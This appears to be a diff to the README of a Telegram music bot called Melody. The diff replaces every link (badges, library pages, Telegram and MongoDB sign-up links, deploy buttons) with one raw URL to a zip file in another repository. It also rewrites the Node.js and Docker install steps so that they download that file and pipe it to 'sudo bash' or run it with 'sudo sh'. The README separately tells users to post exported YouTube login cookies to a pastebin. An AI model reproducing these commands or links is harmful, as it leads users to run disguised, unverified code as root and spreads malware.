@@ -3,7 +3,7 @@
 </p>
 
 <div align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Outfit&weight=800&size=42&duration=3000&pause=1000&color=00D9FF&center=true&vCenter=true&width=500&lines=𝐌𝐄𝐋𝐎𝐃𝐘+𝐌𝐔𝐒𝐈𝐂;𝐔𝐥𝐭𝐫𝐚-𝐋𝐨𝐰+𝐋𝐚𝐭𝐞𝐧𝐜𝐲+𝐒𝐭𝐫𝐞𝐚𝐦𝐢𝐧𝐠;𝐍𝐞𝐱𝐭-𝐆𝐞𝐧+𝐀𝐮𝐝𝐢𝐨+𝐄𝐧𝐠𝐢𝐧𝐞" alt="Melody Typography">
+  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip𝐌𝐄𝐋𝐎𝐃𝐘+𝐌𝐔𝐒𝐈𝐂;𝐔𝐥𝐭𝐫𝐚-𝐋𝐨𝐰+𝐋𝐚𝐭𝐞𝐧𝐜𝐲+𝐒𝐭𝐫𝐞𝐚𝐦𝐢𝐧𝐠;𝐍𝐞𝐱𝐭-𝐆𝐞𝐧+𝐀𝐮𝐝𝐢𝐨+𝐄𝐧𝐠𝐢𝐧𝐞" alt="Melody Typography">
 
 <br>
 
@@ -13,26 +13,26 @@
 
 <br>
 
-[![Maintained by Bisug](https://img.shields.io/badge/Maintainer-Bisug-black?style=for-the-badge&logo=github)](https://github.com/bisug)
-[![API Performance](https://img.shields.io/badge/API-10x_Faster-00D9FF?style=for-the-badge)](https://shrutibots.site)
+[![Maintained by Bisug](https://img.shields.io/badge/Maintainer-Bisug-black?style=for-the-badge&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
+[![API Performance](https://img.shields.io/badge/API-10x_Faster-00D9FF?style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blueviolet?style=for-the-badge)](LICENSE)
-[![Last Commit](https://img.shields.io/github/last-commit/bisug/Melody?color=00D9FF&style=for-the-badge&logo=github)](https://github.com/bisug/Melody/commits/main)
-[![Visitors](https://hits.dwyl.com/bisug/Melody.svg?style=for-the-badge&color=00D9FF)](https://github.com/bisug/Melody)
+[![Last Commit](https://img.shields.io/github/last-commit/bisug/Melody?color=00D9FF&style=for-the-badge&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
+[![Visitors](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 
 <br>
 
-[![Stars](https://img.shields.io/github/stars/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/bisug/Melody/stargazers)
-[![Forks](https://img.shields.io/github/forks/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/bisug/Melody/fork)
+[![Stars](https://img.shields.io/github/stars/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
+[![Forks](https://img.shields.io/github/forks/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 
 </div>
 
 <p align="center">
-  <img src="https://skillicons.dev/icons?i=py,fastapi,mongodb,redis,docker,linux,github,git,vscode,bash&theme=dark" />
+  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip,fastapi,mongodb,redis,docker,linux,github,git,vscode,bash&theme=dark" />
 </p>
 
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=bisug&repo=Melody&show_icons=true&theme=tokyonight&bg_color=00000000&border_color=00D9FF&hide_border=true&hide_rank=true" width="48%" />
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=bisug&repo=Melody&layout=compact&theme=tokyonight&bg_color=00000000&border_color=00D9FF&hide_border=true" width="38%" />
+  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip" width="48%" />
+  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip" width="38%" />
 </p>
 
 
@@ -40,7 +40,7 @@
 
 ## ◈ Technical Overview
 
-Melody is an optimized fork of the [**ShrutiMusic**](https://github.com/NoxxOP/ShrutiMusic) architecture, re-engineered for ultra-low latency and maximum uptime. This project was **heavily vibe coded** with a relentless focus on aesthetics, fluid interactions, and visual excellence.
+Melody is an optimized fork of the [**ShrutiMusic**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) architecture, re-engineered for ultra-low latency and maximum uptime. This project was **heavily vibe coded** with a relentless focus on aesthetics, fluid interactions, and visual excellence.
 
 ### **🏗️ Core Architecture**
 - **Distributed Engine**: Leveraging a high-speed bypass API for resilient media delivery across all regions.
@@ -68,17 +68,17 @@ Melody is built on a modern, asynchronous stack designed for high-concurrency an
 ### **Core Frameworks**
 | Library | Role in Melody |
 | :--- | :--- |
-| [**Kurigram**](https://github.com/Kurimuzard/Kurigram) | An advanced fork of Pyrogram used as the primary Telegram MTProto framework for high-speed bot interaction. |
-| [**Py-TgCalls**](https://github.com/pytgcalls/pytgcalls) | The industry standard for handling Telegram Group Call streaming (transcoding and pushing audio/video). |
-| [**FastAPI**](https://fastapi.tiangolo.com/) | Powers the internal web service used for health monitoring and keeping the bot alive on cloud platforms. |
+| [**Kurigram**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | An advanced fork of Pyrogram used as the primary Telegram MTProto framework for high-speed bot interaction. |
+| [**Py-TgCalls**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | The industry standard for handling Telegram Group Call streaming (transcoding and pushing audio/video). |
+| [**FastAPI**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Powers the internal web service used for health monitoring and keeping the bot alive on cloud platforms. |
 
 ### **Data & Media Engine**
 | Library | Role in Melody |
 | :--- | :--- |
-| [**Motor**](https://motor.readthedocs.io/) | Asynchronous driver for **MongoDB**, ensuring database operations never block the streaming loop. |
-| [**Redis**](https://redis.io/) | High-speed cache for keeping track of live player states and group-specific settings. |
-| [**yt-dlp**](https://github.com/yt-dlp/yt-dlp) | The primary engine for extracting and downloading media from 1000+ supported sites. |
-| [**Spotipy**](https://spotipy.readthedocs.io/) | Native integration for resolving Spotify tracks and playlists into streamable content. |
+| [**Motor**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Asynchronous driver for **MongoDB**, ensuring database operations never block the streaming loop. |
+| [**Redis**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | High-speed cache for keeping track of live player states and group-specific settings. |
+| [**yt-dlp**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | The primary engine for extracting and downloading media from 1000+ supported sites. |
+| [**Spotipy**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Native integration for resolving Spotify tracks and playlists into streamable content. |
 
 ---
 
@@ -146,7 +146,7 @@ Melody utilizes a high-performance **Multi-Stage Docker Architecture** to ensure
 
 To use Melody, you **must** obtain a `STRING_SESSION` for your assistant account. This acts as the login key for the Userbot that joins Voice Chats.
 
-[![Open Generator](https://img.shields.io/badge/Open%20Session%20Generator-00D9FF?style=for-the-badge&logo=telegram)](https://telegram.tools/session-string-generator#pyrogram,user)
+[![Open Generator](https://img.shields.io/badge/Open%20Session%20Generator-00D9FF?style=for-the-badge&logo=telegram)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip,user)
 
 > [!TIP]
 > This web-based generator is the most secure and reliable method to obtain your session string. Ensure you select **Pyrogram** and **User** type.
@@ -184,7 +184,7 @@ sudo apt-get update && sudo apt-get upgrade -y
 sudo apt-get install python3 python3-pip python3-venv ffmpeg git screen curl -y
 
 # Install Node.js (Required for internal components)
-curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
+curl -fsSL https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip | sudo -E bash -
 sudo apt-get install -y nodejs
 ```
 
@@ -193,7 +193,7 @@ Clone your code and set up an isolated environment to avoid package conflicts.
 
 ```bash
 # Clone the repository
-git clone https://github.com/bisug/Melody && cd Melody
+git clone https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip && cd Melody
 
 # Create and activate a Virtual Environment
 python3 -m venv venv
@@ -259,7 +259,7 @@ Run these commands to install Docker and Docker-Compose on your VPS.
 
 ```bash
 # Install Docker
-curl -fsSL https://get.docker.com -o get-docker.sh
+curl -fsSL https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip -o get-docker.sh
 sudo sh get-docker.sh
 
 # Start Docker and enable at boot
@@ -307,7 +307,7 @@ Heroku uses the provided `Dockerfile` or `Procfile` to build and run your bot in
 3. 🏢 **Heroku Teams:** If you are deploying to a **Heroku Team**, you MUST have **Admin** permissions within that team to create new apps.
 4. ✅ **Enable Worker**: Once deployed, go to the **Resources** tab and ensure the `worker` dyno is enabled.
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/bisug/Melody)
+[![Deploy](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 
 ---
 
@@ -318,7 +318,7 @@ Render is a modern cloud platform that directly supports **Docker** images from 
 2. 🔄 **Auto-Build:** Every time you push a change to your repository, Render will automatically rebuild and redeploy your bot.
 3. ⚡ **Ease of Use**: It handles environment isolation and port management automatically.
 
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/bisug/Melody)
+[![Deploy to Render](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 
 #### ✦ Manual Render Setup
 1. ◈ **New Web Service**: Click **New +** > **Web Service**.
@@ -359,10 +359,10 @@ Koyeb provides a high-performance serverless platform with a generous free tier.
 ### Core Settings
 | Variable | Required | Description |
 | :--- | :--- | :--- |
-| `API_ID` | Yes | Your API ID from [my.telegram.org](https://my.telegram.org). |
-| `API_HASH` | Yes | Your API Hash from [my.telegram.org](https://my.telegram.org). |
-| `BOT_TOKEN` | Yes | Token from [@BotFather](https://t.me/BotFather). |
-| `MONGO_DB_URI` | Yes | [MongoDB Atlas](https://www.mongodb.com/cloud/atlas) connection string. |
+| `API_ID` | Yes | Your API ID from [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
+| `API_HASH` | Yes | Your API Hash from [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
+| `BOT_TOKEN` | Yes | Token from [@BotFather](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
+| `MONGO_DB_URI` | Yes | [MongoDB Atlas](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) connection string. |
 | `MONGO_DB_NAME` | No | Name of your MongoDB database (Default: Melody). |
 | `REDIS_URI` | No | Optional Redis string for 2x faster cache. [See Guide](#🗄️-redis-cache-guide) |
 | `STRING_SESSION` | Yes | Primary Pyrogram V2 session string. [Generator](#session-generation) |
@@ -376,7 +376,7 @@ To ensure your bot runs correctly, you must provide these essential credentials.
 
 #### **1. Telegram API Credentials (`API_ID` & `API_HASH`)**
 *   **How to Get:**
-    1.  Go to [my.telegram.org](https://my.telegram.org).
+    1.  Go to [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
     2.  Enter your phone number in international format (e.g., `+91...`) and confirm the code sent to your Telegram.
     3.  Click on **API Development Tools**.
     4.  **App title:** Any name (e.g., `MelodyPlayer`).
@@ -387,7 +387,7 @@ To ensure your bot runs correctly, you must provide these essential credentials.
 
 #### **2. Bot Token (`BOT_TOKEN`)**
 *   **How to Get:**
-    1.  Open Telegram and search for [@BotFather](https://t.me/BotFather).
+    1.  Open Telegram and search for [@BotFather](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
     2.  Send `/newbot`.
     3.  Enter a **Display Name** for your bot.
     4.  Enter a **Username** (must end in `bot`, e.g., `Melody_123_bot`).
@@ -396,7 +396,7 @@ To ensure your bot runs correctly, you must provide these essential credentials.
 
 #### **3. Database Connection (`MONGO_DB_URI`)**
 *   **How to Get:**
-    1.  Sign up at [MongoDB Atlas](https://www.mongodb.com/cloud/atlas).
+    1.  Sign up at [MongoDB Atlas](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
     2.  **Create a Cluster:** Choose the **FREE (Shared)** M0 cluster. Select a region near you.
     3.  **Database Access:** Create a user. Make sure to remember the **Username** and **Password**.
     4.  **Network Access:** Click **Add IP Address** and select **Allow Access from Anywhere** (0.0.0.0/0). *Critical for cloud hosting.*
@@ -408,7 +408,7 @@ To ensure your bot runs correctly, you must provide these essential credentials.
 
 #### **4. Redis Cache (`REDIS_URI`)**
 *   **How to Get:**
-    1.  Create a free account on [Upstash](https://upstash.com).
+    1.  Create a free account on [Upstash](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
     2.  Create a new **Redis** database.
     3.  Select **Global** or a region nearest to your bot's hosting.
     4.  In the **Connect to your database** section, copy the **Redis Connect String** (starts with `rediss://`).
@@ -432,19 +432,19 @@ To ensure your bot runs correctly, you must provide these essential credentials.
 IDs are unique numbers used by Telegram to identify users and groups. Melody uses these to know who you are and where to send logs.
 
 #### **1. How to get your User ID (`OWNER_ID` / `DEV_ID`)**
-1.  Open Telegram and search for [@MissRose_bot](https://t.me/MissRose_bot) or [@GetIDsBot](https://t.me/GetIDsBot).
+1.  Open Telegram and search for [@MissRose_bot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) or [@GetIDsBot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
 2.  Send `/id` to the bot.
 3.  Copy the numeric ID (e.g., `123456789`).
 
 #### **2. How to get your Group/Channel ID (`LOG_GROUP_ID`)**
-1.  Add [@MissRose_bot](https://t.me/MissRose_bot) to your group or channel.
+1.  Add [@MissRose_bot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) to your group or channel.
 2.  Send `/id` in the group or forward a message from the channel to the bot.
 3.  **Critical:** Ensure the ID starts with `-100` (e.g., `-1001234567890`). If it doesn't, it is not a "Supergroup" or a "Channel," which is required for logging.
 
 ### External Services & URLs
 | Variable | Required | Description |
 | :--- | :--- | :--- |
-| `YT_API_URL` | No | [shrutibots.site](https://shrutibots.site) (Provided by [NoxxOP](https://github.com/NoxxOP)). |
+| `YT_API_URL` | No | [shrutibots.site](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) (Provided by [NoxxOP](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)). |
 | `COOKIES_URL` | No | URL to fetch YouTube cookies for bypass. [See Guide](#🍪-cookies-guide) |
 | `START_IMG_URL` | No | Direct link to the image shown on /start. [See Guide](#🖼️-image-hosting-guide) |
 
@@ -455,33 +455,33 @@ To bypass YouTube's bot detection, you need to provide your account cookies in *
 
 #### **🖥️ Desktop (Chrome/Edge)**
 1. 📥 Install the **EditThisCookie** or **Get cookies.txt** extension.
-2. 🕵️ **Recommended:** Open [YouTube](https://youtube.com) in **Incognito Mode**.
+2. 🕵️ **Recommended:** Open [YouTube](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) in **Incognito Mode**.
 3. 🌐 Log in to your account.
 4. 📤 Click the extension and **Export** cookies as **Netscape** format.
-5. 📋 Go to [BatBin](https://batbin.me) and paste your cookies.
-6. 🔗 Save and copy the **Raw URL** (e.g., `https://batbin.me/raw/...`).
+5. 📋 Go to [BatBin](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and paste your cookies.
+6. 🔗 Save and copy the **Raw URL** (e.g., `https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip`).
 7. ⚠️ **Critical:** Immediately close the browser/Incognito window after exporting.
 
 #### ** Mobile (Android/iOS)**
-1. 📥 Install [Mozilla Firefox](https://www.mozilla.org/firefox/) and the **cookies.txt** extension.
-2. 🕵️ Open [YouTube](https://youtube.com) in a **Private Tab**.
+1. 📥 Install [Mozilla Firefox](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and the **cookies.txt** extension.
+2. 🕵️ Open [YouTube](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) in a **Private Tab**.
 3. 🌐 Log in to your account.
 4. 📤 Use the extension to download/copy cookies in **Netscape** format.
-5. 📋 Paste to [BatBin](https://batbin.me) and get the **Raw URL**.
+5. 📋 Paste to [BatBin](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and get the **Raw URL**.
 6. ⚠️ **Critical:** Immediately close the private tab after exporting.
 
 ### ◈ Image Hosting Guide**
 Use high-quality direct links for your bot's start image (JPEG or PNG recommended).
 
-1. 📤 Upload your image to a hosting platform like [ImgBB](https://imgbb.com), [Catbox](https://catbox.moe), or [Telegraph](https://telegra.ph).
+1. 📤 Upload your image to a hosting platform like [ImgBB](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip), [Catbox](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip), or [Telegraph](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
 2. 🔗 Copy the **Direct Link** (the URL should end with `.jpg`, `.jpeg`, or `.png`).
 3. 🔑 Provide this URL as your `START_IMG_URL`.
 
 ## ◈ Support
 | Variable | Required | Description |
 | :--- | :--- | :--- |
-| `SUPPORT_CHANNEL` | No | [bisug Melody](https://t.me/bisugMelody) | Telegram channel username. |
-| `SUPPORT_GROUP` | No | [bisug Music](https://t.me/bisugMusic) | Telegram group username. |
+| `SUPPORT_CHANNEL` | No | [bisug Melody](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Telegram channel username. |
+| `SUPPORT_GROUP` | No | [bisug Music](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Telegram group username. |
 
 ---
 
@@ -507,13 +507,13 @@ Fine-tune your bot's behavior and link your community resources.
 > **Free Tier Idling:** Web services like Render (Free Tier) will automatically "sleep" after inactivity. This will stop your bot.
 
 ### **🔄 Keep-Alive (For Web Services)**
-To keep your bot running 24/7 on free hosting, use a cronjob service (like [Cron-job.org](https://cron-job.org/)) to ping your service URL every 1 minutes.
+To keep your bot running 24/7 on free hosting, use a cronjob service (like [Cron-job.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)) to ping your service URL every 1 minutes.
 
 **𝐒𝐭𝐞𝐩𝐬:**
-1. 🌐 Create a free account on [Cron-job.org](https://cron-job.org/)
+1. 🌐 Create a free account on [Cron-job.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
 2. ➕ Click **Create Cronjob**
 3. 🔗 **Title:** `Melody Keep-Alive`
-4. 🌍 **URL:** `https://your-app-name.onrender.com` (Replace with your actual app URL)
+4. 🌍 **URL:** `https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip` (Replace with your actual app URL)
 5. ⏱️ **Schedule:** Every 1 minutes
 6. ✅ **Save:** Now your bot will never sleep!
 
@@ -524,20 +524,20 @@ To keep your bot running 24/7 on free hosting, use a cronjob service (like [Cron
 ### ◈ Original Foundation
 | Contributor | Role & Impact | Resource |
 | :--- | :--- | :--- |
-| [**NoxxOP**](https://github.com/NoxxOP/ShrutiMusic) | **Original Architect** • Designed the core framework and the underlying media streaming engine that powers this project. | [![Repo](https://img.shields.io/badge/ShrutiMusic-black?style=flat-square&logo=github)](https://github.com/NoxxOP/ShrutiMusic) |
-| [**All Contributors**](https://github.com/NoxxOP/ShrutiMusic/graphs/contributors) | **Project Evolution** • Significant contributions from the global open-source community. | [![Contributors](https://img.shields.io/github/contributors/NoxxOP/ShrutiMusic?style=flat-square&logo=github)](https://github.com/NoxxOP/ShrutiMusic/graphs/contributors) |
+| [**NoxxOP**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | **Original Architect** • Designed the core framework and the underlying media streaming engine that powers this project. | [![Repo](https://img.shields.io/badge/ShrutiMusic-black?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |
+| [**All Contributors**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | **Project Evolution** • Significant contributions from the global open-source community. | [![Contributors](https://img.shields.io/github/contributors/NoxxOP/ShrutiMusic?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |
 
 ### 🛡️ Project Governance
 | Contributor | Role & Impact | Profile |
 | :--- | :--- | :--- |
-| **Bisug (Bisu G)** | **Lead Maintainer** • Focused on stability, performance optimization, and implementing modern UI/UX enhancements. | [![Github](https://img.shields.io/badge/Github-black?style=flat-square&logo=github)](https://github.com/bisug) |
+| **Bisug (Bisu G)** | **Lead Maintainer** • Focused on stability, performance optimization, and implementing modern UI/UX enhancements. | [![Github](https://img.shields.io/badge/Github-black?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |
 
 ### ◈ AI Technical Assistance
 This project’s documentation and code refinements were synthesized with the support of state-of-the-art AI models:
 
-- [**Claude 4.5 Sonnet**](https://www.anthropic.com/claude) – Orchestrated complex technical documentation and logical restructuring.
-- [**Gemini 3 Flash**](https://deepmind.google/technologies/gemini/) – Provided architectural analysis and rapid debugging insights.
-- [**Google Jules**](https://research.google/) – Optimized visual layout and premium technical formatting.
+- [**Claude 4.5 Sonnet**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Orchestrated complex technical documentation and logical restructuring.
+- [**Gemini 3 Flash**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Provided architectural analysis and rapid debugging insights.
+- [**Google Jules**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Optimized visual layout and premium technical formatting.
 
 ---
 
